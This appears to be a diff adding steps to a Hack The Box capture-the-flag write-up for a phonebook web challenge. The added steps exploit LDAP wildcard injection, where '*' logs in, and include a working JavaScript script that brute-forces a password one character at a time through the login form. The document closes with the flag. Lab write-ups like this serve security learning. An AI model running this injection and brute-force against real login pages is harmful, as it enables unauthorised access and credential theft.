@@ -29,7 +29,7 @@ Who is lucky enough to be included in the phonebook?
 ![image](https://user-images.githubusercontent.com/70703371/208025598-3c03e023-b1bb-4768-a2db-184f9b51fb7f.png)
 
 
-6. After did several SQLi command, i found that when i entered both username and password as `*`. We successfully logged in!
+6. After did several SQLi command, i found that when i entered both username and password as `*`. We successfully logged in! With this we know that the website is using LDAP Authentication. We can utilize that to bruteforce the website.
 
 > LOGGED IN
 
@@ -94,6 +94,69 @@ MTY3MTYzNjczNnxEdi1CQkFFQ180SUFBUkFCRUFBQUpfLUNBQUVHYzNSeWFXNW5EQW9BQ0dGMWRHaDFj
 Dv-BBAEC_4IAARABEAAAJ_-CAAEGc3RyaW5nDAoACGF1dGh1c2VyBnN0cmluZwwHAAVyZWVzZQ==
 ```
 
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/208943919-a9f8faa2-32dc-4dfd-a3e8-b49d8d43e670.png)
 
 
+19. Guessing the username as `reese`.
+20. Then bruteforce the password using javascript.
+
+> THE SCRIPT
+
+```js
+function getFlag()
+{
+    //console.clear();
+    var strings = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_' // alphabets to check
+    var i, flag, req; 
+    for (i = 0; i < strings.length; i++) // as long as i lower than the length of strings
+    {
+        flag = 'HTB{' + localStorage.getItem('flag') + strings[i] + '*}'; 
+        req = new XMLHttpRequest();
+        req.open('POST', location.href, false);
+        req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+        req.send('username=reese&password=' + flag); // Username as reese and pass as flag*
+
+        if (req.responseURL.split('message')[1] === undefined)
+        {
+            localStorage.setItem('flag', localStorage.getItem('flag') + strings[i]);
+        }
+
+        console.clear(); // clear the terminal 
+        console.log('HTB{' + localStorage.getItem('flag') + '}'); // concate the flag with HTB prefix -> HTB{ but without the asterisk
+    }
+}
+
+var i;
+for(i = 0; i < 10; i++) // iterate the func 10 times (in case the flag we got is incomplete, then increment the iteration)
+{
+    getFlag();
+}
+```
+
+21. Before run the script, open the localStorage then add a key named `flag` and leave the value blank.
+22. Now run the script at the console.
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/208953908-aaa1a699-f823-404d-80fd-161c71d4ebed.png)
+
+
+23. When i input the flag as answers, it turned green.
+24. Means we got the correct flag!
+
+
+## FLAG
+
+```
+HTB{d1rectory_h4xx0r_is_k00l}
+```
+
+## LEARNING REFERENCES:
+
+```
+https://ldap.com/
+https://www.varonis.com/blog/the-difference-between-active-directory-and-ldap
+```
 
